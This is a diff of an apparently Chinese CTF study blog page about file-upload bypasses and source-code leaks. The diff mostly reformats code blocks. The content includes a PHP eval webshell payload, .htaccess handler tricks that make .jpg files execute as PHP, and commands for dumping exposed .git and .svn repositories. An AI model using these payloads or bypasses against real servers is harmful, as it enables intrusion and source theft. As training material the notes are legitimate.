@@ -386,7 +386,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.8k
+                    2.7k
                 </div>
                 
 
@@ -413,8 +413,8 @@
 <h5 id="1-2、Content-Type-检测文件类型"><a href="#1-2、Content-Type-检测文件类型" class="headerlink" title="1.2、Content-Type 检测文件类型"></a>1.2、Content-Type 检测文件类型</h5><a id="more"></a>
 <p>抓包修改 Content-Type 类型，使其符合白名单规则。</p>
 <h5 id="1-3、绕过服务器文件扩展名检测上传webshell"><a href="#1-3、绕过服务器文件扩展名检测上传webshell" class="headerlink" title="1.3、绕过服务器文件扩展名检测上传webshell"></a>1.3、绕过服务器文件扩展名检测上传webshell</h5><p>服务器端文件扩展名检测是利用服务器端应用程序检测用户上传文件的后缀名，从而做出允许或者阻止的一种方法，该方法包含黑名单和白名单两种形式，具体如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 黑名单检测：一般是建立一个专门的blacklist文件，里面枚举常见的危险文件后缀。</span><br><span class="line">白名单检测：一般是定义一个允许或者阻止用户上传文件类型的后缀的文件，里面枚举相应的文件后缀。</span><br></pre></td></tr></table></figure>
-<p>绕过黑名单检测方法：</p>
+<pre><code> 黑名单检测：一般是建立一个专门的blacklist文件，里面枚举常见的危险文件后缀。
+白名单检测：一般是定义一个允许或者阻止用户上传文件类型的后缀的文件，里面枚举相应的文件后缀。</code></pre><p>绕过黑名单检测方法：</p>
 <ul>
 <li><p>（1）文件名大小写绕过：诸如AsP、Aspx之类的后缀绕过黑名单检测。</p>
 </li>
@@ -449,36 +449,36 @@
 <li>上传上述文件，并使用菜刀连接</li>
 </ul>
 <p>添加文件.htaccess，写入<br><code>AddType application/x-httpd-php .jpg</code><br>或者</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="二、文件上传-文件包含"><a href="#二、文件上传-文件包含" class="headerlink" title="二、文件上传+文件包含"></a>二、文件上传+文件包含</h4><p>demo:<a href="http://123.206.31.85:49166/index.php?file=hello.php" target="_blank" rel="noopener">bugku-文件包含2 writeup</a><br><img src="3.png" alt=""><br>典型就是上传一个文件，然后通过包含来解析，主要是注意过滤了什么。这题过滤了<code>&lt;?php</code><br>所以<code>&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</code>绕过<br><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code>也可<br>有时候shell中执行system，cat的时候没有回显，考虑base64编码<br><code>cmd=system(&quot;cat webshell.php | base64&quot;);</code><br><img src="4.png" alt=""><br>然后可以直接包含进来，也可以执行函数读取<br><img src="5.png" alt=""></p>
+<pre><code>&lt;FilesMatch &quot;shell.jpg&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre><h4 id="二、文件上传-文件包含"><a href="#二、文件上传-文件包含" class="headerlink" title="二、文件上传+文件包含"></a>二、文件上传+文件包含</h4><p>demo:<a href="http://123.206.31.85:49166/index.php?file=hello.php" target="_blank" rel="noopener">bugku-文件包含2 writeup</a><br><img src="3.png" alt=""><br>典型就是上传一个文件，然后通过包含来解析，主要是注意过滤了什么。这题过滤了<code>&lt;?php</code><br>所以<code>&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</code>绕过<br><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code>也可<br>有时候shell中执行system，cat的时候没有回显，考虑base64编码<br><code>cmd=system(&quot;cat webshell.php | base64&quot;);</code><br><img src="4.png" alt=""><br>然后可以直接包含进来，也可以执行函数读取<br><img src="5.png" alt=""></p>
 <h3 id="三、文件源码泄露"><a href="#三、文件源码泄露" class="headerlink" title="三、文件源码泄露"></a>三、文件源码泄露</h3><p>首先通过dirsearch看一下是否是泄露<br><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p>
 <h5 id="3-1、hg-源码泄露-¶"><a href="#3-1、hg-源码泄露-¶" class="headerlink" title="3.1、hg 源码泄露 ¶"></a>3.1、hg 源码泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#hg" target="_blank" rel="noopener">¶</a></h5><p><code>hg init</code> 时会产生 <code>.hg</code> 文件。</p>
 <p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">利用工具 dvcs-ripper</a></p>
 <h5 id="3-2、Git-源码泄露-¶"><a href="#3-2、Git-源码泄露-¶" class="headerlink" title="3.2、Git 源码泄露 ¶"></a>3.2、Git 源码泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#git" target="_blank" rel="noopener">¶</a></h5><p><code>.git</code> 目录内有代码的变更记录等文件，如果部署时该目录下的文件可被访问，可能会被利用来恢复源代码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/.git</span><br><span class="line">/.git/HEAD</span><br><span class="line">/.git/index</span><br><span class="line">/.git/config</span><br><span class="line">/.git/description</span><br></pre></td></tr></table></figure>
-<p>貌似这两个脚本只能在linux下跑？我win10本地不行<br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://www.openssl.org/.git/</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">GitHacker（可恢复完整 Git 仓库）</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHacker.py http://www.openssl.org/.git/</span><br></pre></td></tr></table></figure>
-<p>例题jarvios的babyphp</p>
+<pre><code>/.git
+/.git/HEAD
+/.git/index
+/.git/config
+/.git/description</code></pre><p>貌似这两个脚本只能在linux下跑？我win10本地不行<br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p>
+<pre><code>python GitHack.py http://www.openssl.org/.git/</code></pre><p><a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">GitHacker（可恢复完整 Git 仓库）</a></p>
+<pre><code>python GitHacker.py http://www.openssl.org/.git/</code></pre><p>例题jarvios的babyphp</p>
 <h5 id="3-3、-DS-Store-文件泄露-¶"><a href="#3-3、-DS-Store-文件泄露-¶" class="headerlink" title="3.3、.DS_Store 文件泄露 ¶"></a>3.3、<code>.DS_Store</code> 文件泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#ds_store" target="_blank" rel="noopener">¶</a></h5><p>Mac OS 中会包含有 <code>.DS_Store</code> 文件，包含文件名等信息。</p>
 <p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">利用工具 ds＿store＿exp</a><br>例题bugku ctf sql注入2</p>
 <h5 id="3-4、网站备份文件-¶"><a href="#3-4、网站备份文件-¶" class="headerlink" title="3.4、网站备份文件 ¶"></a>3.4、网站备份文件 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_20" target="_blank" rel="noopener">¶</a></h5><p>管理员备份网站文件后错误地将备份放在 Web 目录下。</p>
 <p>常见的后缀名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.txt</span><br></pre></td></tr></table></figure>
-
-<h5 id="3-5、SVN-泄露-¶"><a href="#3-5、SVN-泄露-¶" class="headerlink" title="3.5、SVN 泄露 ¶"></a>3.5、SVN 泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#svn" target="_blank" rel="noopener">¶</a></h5><p>敏感文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/.svn</span><br><span class="line">/.svn/wc.db</span><br><span class="line">/.svn/entries</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://github.com/admintony/svnExploit" target="_blank" rel="noopener">https://github.com/admintony/svnExploit</a><br>检测SVN源代码泄露</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn</span><br></pre></td></tr></table></figure>
-<p>下载源代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn --dump</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="3-6、WEB-INF-web-xml-泄露-¶"><a href="#3-6、WEB-INF-web-xml-泄露-¶" class="headerlink" title="3.6、WEB-INF / web.xml 泄露 ¶"></a>3.6、WEB-INF / web.xml 泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#web-inf-webxml" target="_blank" rel="noopener">¶</a></h5><p>WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系。</p>
+<pre><code>.rar
+.zip
+.7z
+.tar
+.tar.gz
+.bak
+.txt</code></pre><h5 id="3-5、SVN-泄露-¶"><a href="#3-5、SVN-泄露-¶" class="headerlink" title="3.5、SVN 泄露 ¶"></a>3.5、SVN 泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#svn" target="_blank" rel="noopener">¶</a></h5><p>敏感文件：</p>
+<pre><code>/.svn
+/.svn/wc.db
+/.svn/entries</code></pre><p><a href="https://github.com/admintony/svnExploit" target="_blank" rel="noopener">https://github.com/admintony/svnExploit</a><br>检测SVN源代码泄露</p>
+<pre><code>python SvnExploit.py -u http://192.168.27.128/.svn</code></pre><p>下载源代码</p>
+<pre><code>python SvnExploit.py -u http://192.168.27.128/.svn --dump</code></pre><h5 id="3-6、WEB-INF-web-xml-泄露-¶"><a href="#3-6、WEB-INF-web-xml-泄露-¶" class="headerlink" title="3.6、WEB-INF / web.xml 泄露 ¶"></a>3.6、WEB-INF / web.xml 泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#web-inf-webxml" target="_blank" rel="noopener">¶</a></h5><p>WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系。</p>
 <p>WEB-INF 主要包含一下文件或目录：</p>
 <ul>
 <li><code>/WEB-INF/web.xml</code> ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
@@ -488,13 +488,9 @@
 <li><code>/WEB-INF/database.properties</code> ：数据库配置文件。</li>
 </ul>
 <p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location ~ ^/WEB-INF/* &#123; deny all; &#125; # 或者return 404; 或者其他！</span><br></pre></td></tr></table></figure>
-
-<h5 id="3-7、CVS-泄露-¶"><a href="#3-7、CVS-泄露-¶" class="headerlink" title="3.7、CVS 泄露 ¶"></a>3.7、CVS 泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#cvs" target="_blank" rel="noopener">¶</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root 返回根信息</span><br><span class="line">http://url/CVS/Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure>
-
-<p>取回源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http://url/name dir</span><br></pre></td></tr></table></figure>
-<h5 id="3-8、-swp文件"><a href="#3-8、-swp文件" class="headerlink" title="3.8、.swp文件"></a>3.8、.swp文件</h5><p>关于swp文件<br>使用vi，经常可以看到swp这个文件,那这个文件是怎么产生的呢，当你打开一个文件，vi就会生成这么一个.(filename)swp文件以备不测（不测下面讨论），如果你正常退出，那么这个这个swp文件将会自动删除。下面说不测。<br>直接访问<code>.submit.php.swp</code>即可</p>
+<pre><code>location ~ ^/WEB-INF/* { deny all; } # 或者return 404; 或者其他！</code></pre><h5 id="3-7、CVS-泄露-¶"><a href="#3-7、CVS-泄露-¶" class="headerlink" title="3.7、CVS 泄露 ¶"></a>3.7、CVS 泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#cvs" target="_blank" rel="noopener">¶</a></h5><pre><code>http://url/CVS/Root 返回根信息
+http://url/CVS/Entries 返回所有文件的结构</code></pre><p>取回源码</p>
+<pre><code>bk clone http://url/name dir</code></pre><h5 id="3-8、-swp文件"><a href="#3-8、-swp文件" class="headerlink" title="3.8、.swp文件"></a>3.8、.swp文件</h5><p>关于swp文件<br>使用vi，经常可以看到swp这个文件,那这个文件是怎么产生的呢，当你打开一个文件，vi就会生成这么一个.(filename)swp文件以备不测（不测下面讨论），如果你正常退出，那么这个这个swp文件将会自动删除。下面说不测。<br>直接访问<code>.submit.php.swp</code>即可</p>
 
             </div>
             <hr/>
@@ -875,7 +871,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">175.5k</span>&nbsp;字
+                class="white-color">173.5k</span>&nbsp;字
             
             
             
